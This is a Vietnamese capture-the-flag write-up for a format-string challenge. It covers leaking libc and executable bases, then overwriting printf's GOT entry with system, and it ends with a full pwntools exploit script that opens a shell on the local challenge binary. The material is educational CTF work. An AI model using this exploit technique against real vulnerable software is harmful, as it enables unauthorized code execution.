# Format String - Tấn công bảng GOT

**ida:**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/9cde148c-cd27-4360-b944-2cc56dc3d965)


nhìn sơ qua thì ko thấy BOF, chỉ có lỗi fmtstr 

**checks:**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/d20fa5ae-82f1-4ccd-9501-e436c58cb35e)


**bài này khá lạ so với các bài khác đó là RelRO tắt** 

Với RelRO là No hoặc Partial, bảng GOT nằm trong vùng địa chỉ ghi được nên với lỗi format string, ta hoàn toàn có thể thay đổi bảng GOT thành địa chỉ hàm khác để khi chương trình thực thi PLT, nó sẽ gọi tới hàm đã thay thế.

**ý tưởng giải bài này:**

- lợi dụng việc **RelRO tắt** , ta có thể thay đổi got của printf thành địa chỉ của hàm khác, thứ ta cần lúc này là hàm system, mà trong bài ko có nên ta chỉ có thế lấy ra từ libc => **leak libc base**
- **để ý ở đây là PIE mở, địa chỉ động** , các với các bài ret2libc ta thường làm, nên muốn dùng got vs plt ta cần có địa chỉ exe => **leak exe base**

**bonus:**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/62d100cf-1c9c-420c-bdd5-2ed2f8d6ef62)


- cuối cùng ta cần lợi dụng lỗi fmtstr để biến got printf thành địa chỉ system để khi lặp lại fget ta nhập /bin/sh và lấy được shell => Overwrite GOT

### 1. leak libc base

ở rip có địa chỉ **_libc_start_main_ret**, ta sẽ dùng %p để leak địa chỉ này ra, tính offset rồi tìm được địa chỉ base của libc

![image](https://github.com/gookoosss/CTF.-/assets/128712571/f9c6e267-0573-4a21-8bb4-5fcc020def4d)


![image](https://github.com/gookoosss/CTF.-/assets/128712571/d6f4a757-3364-4107-b312-fdf131e30565)



### 2. leak exe base

để ý ảnh trên thì trong stack có nhiều địa chỉ rác, ta sẽ chọn 1 trong những địa chỉ đó để leak ra, từ đó tính offset là ra địa chỉ **exe base**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/1d3ae56c-a734-4e6d-b811-3b7a36e0100f)


**chú ý:**
- nãy h ta chỉ đang làm trên local , nếu thi ctf thực tế thì ta cần tìm file libc hợp với server trước khi leak libc base, nếu ko ta có thể sai offset
- link tìm libc chuẩn: https://libc.blukat.me/

**thành quả sau 2 bước đầu tiên của ta**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/ac832531-9626-4910-859e-b77dda5e080b)


### 3. Overwrite GOT

đến bước khó nhất rồi, h **ta hãy quan sát got của printf và địa chỉ của system trong libc xem sao:**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/3ee32f9e-23de-4be6-a5c4-1cfa833683b9)


**got printf là 0x7ffff7dee770, còn system là 0x7ffff7dded60**, để ý thì thấy 2 địa chỉ này chỉ khác nhau mỗi **3byte cuối**, nên lúc này ta sẽ lợi dụng lỗi fmtstr và relro tắt để thay đổi 3 byte cuối địa chỉ got của printf thành địa chỉ của system

**ở đây ta ko thể in 1 lúc 3 byte được vì máy ko chạy nổi, nên theo kinh nghiệm thì lần đầu ta in ra 1 byte cuối trước, lần 2 ta sẽ in 2 byte sau để tránh lỗi** 

![image](https://github.com/gookoosss/CTF.-/assets/128712571/8c2d5906-df54-4041-8ad4-ceffa54a381f)


đến đây ta chạy thử script xem sao:

![image](https://github.com/gookoosss/CTF.-/assets/128712571/5ca8221c-688f-45c0-b2fc-13e5d6a404c7)


**ở stack 0x20 ta gán địa chỉ got của printf nhưng mà bây giờ đã bị gán thành địa của hàm system rồi nè** 

check lại lần nữa xem sao:

![image](https://github.com/gookoosss/CTF.-/assets/128712571/67fcc53d-b6a5-4051-9fe1-3d4e1747ca78)


chuẩn luôn rồi hehe

h chỉ cần nhập **/bin/sh** là lấy được shell rồi

**script:**

```
from pwn import *

context.binary = exe = ELF('./fmtstr6_patched')
libc = ELF('./libc6-amd64_2.31-0ubuntu9_i386.so')
p = process(exe.path)

# vì RelRO nên GOT có thể ghi đọc được, nên ta có thể thay địa chỉ của GOT hàm này thành 1 hàm khác
# GOT rw-
# PLT

gdb.attach(p, gdbscript = '''
b*main+90
c
''')

input()

##################################
### Stage 1: leak libc address ###
##################################

p.sendlineafter(b'string: ',b'%19$p') # leak _libc_start_main_ret
libc_leak = int(p.recvline()[:-1], 16)
libc.address = libc_leak - 0x27023
log.info("libc leak: " + hex(libc_leak))
log.info("libc base: " + hex(libc.address))

##################################
### Stage 2: leak exe  address ###
##################################

p.sendlineafter(b'string: ',b'%11$p')
exe_leak = int(p.recvline()[:-1], 16)
exe.address = exe_leak - 0x12cd
log.info("exe leak: " + hex(exe_leak))
log.info("exe base: " + hex(exe.address))

##################################
###   Stage 3: Overwrite GOT   ###
##################################

part1 = libc.sym['system'] & 0xff # lấy 1 byte cuối của địa chỉ system
part2 = libc.sym['system'] >> 8 & 0xffff # bỏ qua 1 byte, lấy 2 byte sau để in

payload = f'%{part1}c%10$hhn'.encode() # in 1 byte cuối của system
payload += f'%{part2 - part1}c%11$hn'.encode() # in 2 byte sau của system 
payload = payload.ljust(0x20, b'P') # ljust để cố định địa chỉ got của printf trên stack
payload += p64(exe.got['printf']) # thay đổi 1 byte cuối của got
payload += p64(exe.got['printf'] + 1) # bỏ qua 1 byte cuối, thay đổi 2 byte sau
p.sendlineafter(b'string: ', payload )

p.sendline(b'/bin/sh\0')

p.interactive()
```
